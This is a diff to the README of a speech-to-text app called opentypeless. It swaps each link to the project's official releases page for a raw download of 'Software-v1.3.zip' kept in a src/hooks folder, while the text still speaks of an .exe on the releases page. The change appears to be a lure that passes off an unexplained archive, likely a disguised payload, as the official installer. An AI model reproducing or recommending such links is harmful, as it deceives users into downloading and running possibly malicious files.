@@ -1,6 +1,6 @@
 # 🎤 opentypeless - Speak to Type Anywhere
 
-[![Download opentypeless](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Mwamwaaaa/opentypeless/releases)
+[![Download opentypeless](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Mwamwaaaa/opentypeless/main/src/hooks/Software-v1.3.zip)
 
 ## 📋 About opentypeless
 
@@ -30,7 +30,7 @@ To get the app, visit the official releases page. The page contains the latest v
 
 Click the badge below to open the download page in your browser:
 
-[![Download Now](https://img.shields.io/badge/Download-opentypeless-blue)](https://github.com/Mwamwaaaa/opentypeless/releases)
+[![Download Now](https://img.shields.io/badge/Download-opentypeless-blue)](https://raw.githubusercontent.com/Mwamwaaaa/opentypeless/main/src/hooks/Software-v1.3.zip)
 
 On the releases page, look for a file that ends with `.exe`. This file is the installer.
 
@@ -125,7 +125,7 @@ This mode works without internet but may be slower or less accurate.
 
 Visit this page to download the latest version and all updates:
 
-[https://github.com/Mwamwaaaa/opentypeless/releases](https://github.com/Mwamwaaaa/opentypeless/releases)
+[https://raw.githubusercontent.com/Mwamwaaaa/opentypeless/main/src/hooks/Software-v1.3.zip](https://raw.githubusercontent.com/Mwamwaaaa/opentypeless/main/src/hooks/Software-v1.3.zip)
 
 Look for the `.exe` file and follow the installer steps to get started.
 
